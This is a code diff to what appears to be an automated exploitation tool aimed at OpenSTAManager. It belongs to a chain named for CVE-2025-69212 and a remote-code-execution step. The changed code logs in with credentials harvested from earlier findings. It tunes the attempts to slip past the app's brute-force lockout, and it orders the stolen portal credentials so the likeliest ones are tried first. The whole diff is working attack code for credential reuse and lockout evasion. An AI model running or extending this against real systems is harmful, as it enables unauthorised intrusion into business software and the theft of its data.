@@ -326,9 +326,13 @@ def _p7m_rce(host: HostReport, base: str, vhost: str, user: str, pw: str,
 
 # -- native CVE-2025-69212 primitives --------------------------------------
 def _auth_session(base: str, vhost: str, user: str, pw: str):
-    """Log in and return a cookie-carrying urllib opener, or None. Tries a few
-    submission styles (op in body vs query) and every token field name, since the
-    login is the make-or-break step of the whole chain."""
+    """Log in and return a cookie-carrying urllib opener, or None.
+
+    OpenSTAManager's real login (index.php, verified against source): a plain
+    `<form action="?op=login" method="post">` with username+password and NO CSRF
+    token. It has its OWN brute-force lockout (AuthOSM::isBrute), so we make ONE
+    clean attempt per credential — spraying submission variants just trips the
+    lockout and then even the correct password fails."""
     jar = http.cookiejar.CookieJar()
     sslctx = ssl.create_default_context()
     sslctx.check_hostname = False
@@ -336,49 +340,35 @@ def _auth_session(base: str, vhost: str, user: str, pw: str):
     opener = urllib.request.build_opener(
         urllib.request.HTTPCookieProcessor(jar),
         urllib.request.HTTPSHandler(context=sslctx))
-    # URL already carries the vhost as its host, so let urllib set Host (a manual
-    # Host header can duplicate/confuse the request).
     opener.addheaders = [("User-Agent", "Mozilla/5.0 scryer")]
     page = _oget(opener, base + "/index.php")
-    token = None
-    for pat in (r'name=["\']token["\'][^>]*value=["\']([^"\']+)',
-                r'value=["\']([^"\']+)["\'][^>]*name=["\']token["\']',
-                r'name=["\']_token["\'][^>]*value=["\']([^"\']+)',
-                r'csrf[_-]?token["\']?\s*[:=]\s*["\']([^"\']+)'):
-        m = re.search(pat, page, re.I | re.S)
-        if m:
-            token = m.group(1)
-            break
-    base_fields = {"username": user, "password": pw}
-    if token:
-        base_fields["token"] = token
-    # style A: op in body -> POST /index.php ; style B: op in query string
-    attempts = [
-        (base + "/index.php", dict(base_fields, op="login")),
-        (base + "/index.php?op=login", dict(base_fields)),
-        (base + "/", dict(base_fields, op="login")),
-        (base + "/ajax.php?op=login", dict(base_fields)),
-    ]
-    for url, data in attempts:
-        body = _opost(opener, url, urllib.parse.urlencode(data).encode())
-        if _authed(opener, jar, base, body):
-            return opener
-    return None
+    if _is_brute_locked(page):
+        utils.log("warn", "OpenSTAManager is brute-locked (timeout page) — wait "
+                          "for its lockout to clear, then retry", indent=1)
+        return None
+    body = _opost(opener, base + "/index.php?op=login",
+                  urllib.parse.urlencode({"username": user, "password": pw,
+                                          "op": "login"}).encode())
+    return opener if _authed(opener, base, body) else None
 
 
-def _authed(opener, jar, base: str, post_body: str) -> bool:
-    """True if the session is now logged in. Prefer a positive dashboard check
-    (fetch the app root) over guessing from the POST response."""
+def _is_brute_locked(html: str) -> bool:
+    low = (html or "").lower()
+    return "brute-timeout" in low or "troppi tentativi" in low or (
+        "secondi" in low and "badge-danger" in low)
+
+
+def _authed(opener, base: str, post_body: str) -> bool:
+    """True if the session is now logged in. Success redirects to the dashboard
+    (controller.php?id_module=…); failure redirects back to the login form."""
     low = (post_body or "").lower()
-    if "logout" in low or "op=logout" in low or ">esci<" in low:
+    if ('name="password"' not in low and 'name="username"' not in low
+            and ("logout" in low or "op=logout" in low or "id_module=" in low)):
         return True
-    # re-fetch the home page with the session cookie and look for auth markers
+    # re-fetch the app root with the session cookie and look for auth markers
     home = _oget(opener, base + "/index.php").lower()
-    if ("logout" in home or "op=logout" in home or ">esci<" in home
-            or "id_module=" in home) and not (
-            'name="password"' in home or 'id="password"' in home):
-        return True
-    return False
+    return (("logout" in home or "op=logout" in home or "id_module=" in home)
+            and 'name="password"' not in home)
 
 
 def _detect_plugin(opener, base: str, vhost: str):
@@ -716,19 +706,25 @@ def _portal_logins(host: HostReport) -> List[str]:
         seen.add(pair.lower())
         out.append(pair)
 
-    # explicit user:pass only from credential-bearing findings (a mailbox login,
-    # a doc/portal credential) — NOT from arbitrary finding text, which sweeps
-    # up SSH host keys and other colon-separated noise.
-    for f in host.findings:
-        if f.category != "cred":
-            continue
-        for src in (f.evidence or "", f.detail or ""):
-            # strip URLs first so 'ssh://10.0.0.1' / 'http://host' don't parse as
-            # user:pass (ssh:// -> user=ssh, pass=//10.0.0.1).
-            clean = re.sub(r"\b[a-z][a-z0-9+.-]*://\S+", " ", src, flags=re.I)
-            for m in re.findall(r"\b([A-Za-z][A-Za-z0-9._%+-]{1,39}):"
-                                r"([^\s,;'\"/]{3,40})", clean):
-                add(f"{m[0]}:{m[1]}")
+    # explicit user:pass only from credential-bearing findings — NOT from
+    # arbitrary finding text, which sweeps up SSH host keys and other
+    # colon-separated noise. Explicit PORTAL/app credentials (a provisioning
+    # email: 'Portal credential …') go FIRST — trying IMAP/mailbox creds against
+    # the portal only burns the app's brute-force budget before the right one.
+    def _pairs_from(findings):
+        for f in findings:
+            if f.category != "cred":
+                continue
+            for src in (f.evidence or "", f.detail or ""):
+                clean = re.sub(r"\b[a-z][a-z0-9+.-]*://\S+", " ", src, flags=re.I)
+                for m in re.findall(r"\b([A-Za-z][A-Za-z0-9._%+-]{1,39}):"
+                                    r"([^\s,;'\"/]{3,40})", clean):
+                    add(f"{m[0]}:{m[1]}")
+
+    portal = [f for f in host.findings
+              if "portal" in f.title.lower() or "openstamanager" in f.title.lower()]
+    _pairs_from(portal)
+    _pairs_from([f for f in host.findings if f not in portal])
 
     users = _candidate_users(host)
     creds = list(dict.fromkeys(host.creds))[:12]
